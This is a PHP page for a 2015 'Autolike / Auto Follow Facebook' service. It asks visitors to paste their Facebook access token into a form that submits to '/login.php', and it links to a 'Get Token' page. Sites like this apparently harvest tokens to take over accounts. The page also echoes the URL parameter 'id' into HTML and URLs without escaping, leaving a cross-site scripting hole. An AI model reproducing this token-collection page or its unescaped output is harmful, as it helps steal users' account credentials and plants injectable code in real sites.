<?php
#-----------------------------------------------------#
jk
#-----------------------------------------------------#
?><?php
$u = $_GET["id"];
?>

<head>
<title>Autolike Facebook by 
<? echo $u ; ?>
</title>
<link rel="stylesheet" type="text/css" href="http://kisni.wen.ru/archive/css/golden/style.css" media="all,handheld"/>
</head>
<div class="menu"><center><h2>AUTO Follow Facebook 2015</h2></center></div>

<body style="background-image:url(https://graph.facebook.com/<? echo $u ; ?>/picture)">

<div class="foot a"><b> Follow Admin</b> </div>
<div class="iblock1">
<a href="http://m.facebook.com/<? echo $u ; ?>"><img src="https://graph.facebook.com/<? echo $u ; ?>/picture" width="80" class="l profpic img" alt="<? echo $u ; ?>"/></a><hr>
<iframe src="http://www.facebook.com/plugins/subscribe.php?href=http://www.facebook.com/<? echo $u ; ?>&amp;layout=button_count&amp;show_faces=true&amp;width=110&amp;action=like&amp;font=tahoma&amp;colorscheme=light&amp;height=21" scrolling="no" frameborder="0" style="border:none" overflow:hidden;="" width:50px;="" height:50px;"="" allowTransparency="true"></iframe><div>



<div class="menu_razd"> Get Token <a href="/token.php" target="_blank"> [Skype] </a></div>



<div class="menu_razd">


<form
method="get" class="menu" action="/login.php">
<input class="hijau" name="user" rows="2" cols="15" style="width: 70%;margin-left: 15%;" placeholder="Access token..." value="" type="text">
<input value="Submit" type="submit" class="p_t" />
</form>
</div>


<center>
<div class="aut">Copyright &copy;  <? echo $u ; ?>
 <br>
2015</div>
<noscript/>
